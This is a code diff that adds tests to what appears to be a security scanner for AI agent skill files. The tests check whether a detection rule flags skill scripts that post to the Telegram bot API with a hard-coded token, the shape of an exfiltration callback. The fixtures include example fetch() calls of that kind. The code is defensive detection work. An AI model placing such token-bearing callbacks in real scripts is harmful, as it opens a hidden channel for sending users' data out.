@@ -865,6 +865,41 @@ class TestDropperOverLines:
         assert self._found(tmp_path, text) == []
 
 
+class TestTelegramNotifier:
+    """A skill script that posts to the Telegram bot API with a token the user supplies is a
+    notifier, not an install-time callback; one that carries a literal token is the exfil shape."""
+
+    @staticmethod
+    def _found(tmp_path, script: str) -> list:
+        files = {
+            ".claude/skills/notes/SKILL.md": "---\nname: notes\n---\nSends a note.\n",
+            ".claude/skills/notes/scripts/send.mjs": script,
+        }
+        return AgentsHelpers._rules(AgentsHelpers._scan(tmp_path, files)).get(
+            "MALWARE.EXFIL.INSTALL_CALLBACK.001", []
+        )
+
+    def test_a_token_from_the_environment_is_not_a_callback(self, tmp_path) -> None:
+        script = (
+            "const token = process.env.TELEGRAM_BOT_TOKEN;\n"
+            "await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {method: 'POST'});\n"
+        )
+        assert self._found(tmp_path, script) == []
+
+    def test_a_literal_token_in_the_file_still_is(self, tmp_path) -> None:
+        script = (
+            "const token = '1234567890:AAEhBP0av28SvEgvHMX-cV2xyz012345678';\n"
+            "await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {method: 'POST'});\n"
+        )
+        assert self._found(tmp_path, script) != []
+
+    def test_a_token_written_into_the_url_still_is(self, tmp_path) -> None:
+        script = (
+            "await fetch('https://api.telegram.org/bot1234567890:AAEhBP0av28SvEgvHMX-cV2xyz0123456789/sendMessage');\n"
+        )
+        assert self._found(tmp_path, script) != []
+
+
 class TestRequiredTool:
     """`SUSPECT.AGENT.PHANTOM_PREREQUISITE.001` worded as "X is required"."""
 
